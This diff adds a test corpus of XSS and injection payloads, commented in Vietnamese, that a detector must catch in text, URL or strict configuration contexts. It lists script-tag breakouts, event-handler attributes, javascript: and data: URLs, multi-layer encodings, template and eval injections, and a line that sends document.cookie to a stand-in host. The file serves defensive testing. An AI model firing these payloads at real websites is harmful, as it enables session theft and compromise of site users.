@@ -1,0 +1,129 @@
+# Corpus payload độc — mỗi dòng: "<ctx> <payload>" (tách ở dấu cách ĐẦU TIÊN, phần sau giữ nguyên văn).
+# ctx: any    = phải bị bắt ở MỌI ngữ cảnh (text, URL, strict)
+#      url    = phải bị bắt ở ngữ cảnh URL và strict (text có thể không — vd "javascript: alert(1)")
+#      strict = chỉ bắt ở strict (giá trị cấu hình)
+# Host thật đã thay bằng example.com. Payload dùng ký tự điều khiển / vô hình nằm trong detect_test.go.
+
+# --- thẻ script / thoát ngữ cảnh ---
+any <script>alert(1)</script>
+any <ScRiPt>alert(1)</sCrIpT>
+any <script src=//example.com/x.js></script>
+any product</script><script>/*X*/fetch('//example.com')</script>
+any product</script><script>/*ARXOMEGAV3*/var a=atob('Y2hlY2s=');</script>
+any '"--></style></scRipt><scRipt src="//example.com/x"></scRipt>
+any </title><script>alert(1)</script>
+any <textarea></textarea><script>alert(1)</script>
+any <<SCRIPT>alert("XSS");//<</SCRIPT>
+any <scr<script>ipt>alert(1)</scr</script>ipt>
+any <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+any <svg><script>alert&#40;1&#41;</script>
+any <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+any <STYLE>@import'http://example.com/xss.css';</STYLE>
+
+# --- thẻ có thuộc tính sự kiện ---
+any <img src=x onerror=alert(1)>
+any <img src=x onerror=alert(1)//
+any <iMg src=N onerror="this.onerror='';this.src='//example.com/'+document.cookie"
+any "><svg/onload=alert(1)>
+any "><img src=x onerror=alert(1)>
+any <svg onload=alert(1)//
+any <svg><animate onbegin=alert(1) attributeName=x dur=1s>
+any <body onload=alert(1)>
+any <input autofocus onfocus=alert(1)>
+any <details open ontoggle=alert(1)>
+any <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+any <video><source onerror="alert(1)">
+any <audio src=x onerror=alert(1)>
+any <marquee onstart=alert(1)>
+any <x onclick=alert(1)>click me</x>
+any <a onmouseover=alert(1)>x</a>
+any <isindex type=image src=1 onerror=alert(1)>
+any <xss onafterscriptexecute=alert(1)><script>1</script>
+any <button popovertarget=x>Click</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
+any <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+# --- thoát thuộc tính (không có thẻ) ---
+any x" onmouseover="alert(1)
+any x' onfocus='alert(1)' autofocus='
+any x"/onload="alert(1)
+any "onmouseover=alert(1)//
+any `onerror=alert(1)
+
+# --- URL javascript: / data: trong thuộc tính ---
+any <iframe src="javascript:alert(1)"></iframe>
+any <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+any <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+any <embed src="javascript:alert(1)">
+any <a href="javascript:alert(1)">click</a>
+any <a href="jav&#x09;ascript:alert(1)">x</a>
+any <a href="&#x6A;avascript:alert(1)">x</a>
+any <IMG SRC=JaVaScRiPt:alert('XSS')>
+any <IMG SRC="jav&#x0A;ascript:alert('XSS');">
+any <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+any <IMG SRC=" &#14;  javascript:alert('XSS');">
+any <div style="background:url(javascript:alert(1))">
+any <TABLE BACKGROUND="javascript:alert('XSS')">
+any <DIV STYLE="width: expression(alert('XSS'));">
+any <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+any <base href="//example.com/">
+any <link rel=stylesheet href=//example.com/x.css>
+any <form action="javascript:alert(1)"><button>x</button></form>
+any javascript:alert(1)
+any javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+any https://example.com/?redirect=javascript:alert(1)
+any data:text/html,<script>alert(1)</script>
+
+# --- comment / CDATA / khai báo ---
+any <!--<img src="--><img src=x onerror=alert(1)//">
+any <![CDATA[<script>alert(1)</script>]]>
+any <?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+
+# --- mã hoá / nguỵ trang ---
+any %3Cscript%3Ealert(1)%3C%2Fscript%3E
+any %253Cscript%253Ealert(1)%253C%252Fscript%253E
+any %26lt%3Bscript%26gt%3Balert(1)
+any %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+any %EF%BC%9Cscript%EF%BC%9Ealert(1)
+any &lt;script&gt;alert(1)&lt;/script&gt;
+any &amp;lt;script&amp;gt;alert(1)
+any &ltscript&gt;alert(1)
+any &#60;img src=x onerror=alert(1)&#62;
+any &#x3C;svg onload=alert(1)&#x3E;
+any &#0000060;script&#0000062;alert(1)
+any \u003cscript\u003ealert(1)\u003c/script\u003e
+any \x3cimg src=x onerror=alert(1)\x3e
+any ＜script＞alert(1)＜/script＞
+
+# --- dạng công cụ quét XSS nhét payload vào query storefront ---
+any https://example.com/products/x?_pos=4&_psid=30070ad70&_psq=3&_ss=<iMg%20src%3dN%20onerror%3d"this.onerror%3d%27%27%3bthis.src%3d%27%2f%2fexample.com
+any https://example.com/products/x?_pos=4&_ss=%27"--><%2fstyle><%2fscRipt><scRipt%20src%3d"%2f%2fexample.com
+any https://example.com/products/x?_ss=<iMg%20src%3d"%2f%2fexample.com%2fimages%2f1.jpg"%20onload%3d"this.onload%3d%27%27%3bthis
+any https://example.com/?q=%3Csvg%2Fonload%3Dalert(1)%3E
+
+# --- URL bắt đầu bằng scheme nguy hiểm (ngữ cảnh URL) ---
+url javascript: alert(1)
+url   javascript:alert(1)
+url JaVaScRiPt:alert(document.domain)
+url java%0ascript:alert(1)
+url vbscript:msgbox(1)
+url data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+url javascript&colon;alert(1)
+
+# --- chỉ giá trị cấu hình (strict): template, lời gọi JS, thoát chuỗi JS ---
+strict {{ 'x' | append: 'y' }}
+strict {% raw %}x{% endraw %}
+strict ${alert(1)}
+strict <%= system('id') %>
+strict eval(atob('YWxlcnQoMSk='))
+strict String.fromCharCode(97,108)
+strict document.cookie
+strict window.location='//example.com'
+strict setTimeout('x',1)
+strict ";alert(1);//
+strict '-alert(1)-'
+
+# --- mã hoá lồng sâu (thực thể trong %XX, %25 nhiều lớp, &amp; nhiều lớp) ---
+any %26amp%3Blt%3Bscript%26amp%3Bgt%3Balert(1)
+any &amp;amp;lt;script&amp;amp;gt;alert(1)
+any %25253Cscript%25253Ealert(1)
+any %26%2360%3Bimg src=x onerror=alert(1)%26%2362%3B
